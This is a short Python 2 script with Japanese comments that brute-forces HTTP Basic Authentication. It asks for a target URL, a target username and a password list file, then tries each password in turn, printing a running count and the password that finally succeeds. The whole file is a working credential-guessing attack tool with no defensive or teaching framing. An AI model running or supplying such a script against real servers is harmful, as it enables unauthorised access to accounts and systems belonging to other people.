#!python
# -*- coding: utf-8 -*-

import urllib2

###サーバとの接続
def access_server(url,username,password):
    try:
        # ユーザ名とパスワードを登録する
        password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
        password_mgr.add_password(None,url,username,password)

        # 認証情報付きでアクセスする
        handler = urllib2.HTTPBasicAuthHandler(password_mgr)
        opener = urllib2.build_opener(handler)
        urllib2.install_opener(opener)
        result = urllib2.urlopen(url)

        # 取得した内容を出力する
        return True

    except:
        return False



###ユーザとのインターフェース

#urlとユーザ名とパスワードのリストが入ったテキストファイルのファイル名を入力
#URL
print "enter target url"
url = raw_input()
#ユーザ名
print "enter target username"
username = raw_input()
#パスワードのリストの入ったテキストファイル名
print "enter textfile which have passwords"
pass_list_txt = raw_input()

#テキストファイルの読み込み設定
password_txt = open(pass_list_txt)
line = password_txt.readline()



###メインとなる処理

count = 0 #カウントに使う変数の宣言と初期化
#テキストファイルが読み終わるまで
while line:
    line = line[:-1] #最後の改行文字を消す
    result = access_server(url,username,line)
    #Trueが返ってきた（エラーを起こさなかった）場合
    if result:
        break #ループの終了
    #Falseが返ってきた（エラーを起こした）場合
    else:
        #カウント
        count = count + 1
        print count
        #テキストファイルの一行読み込み
        line = password_txt.readline()

#結果を出力した後、後処理。
print line
password_txt.close
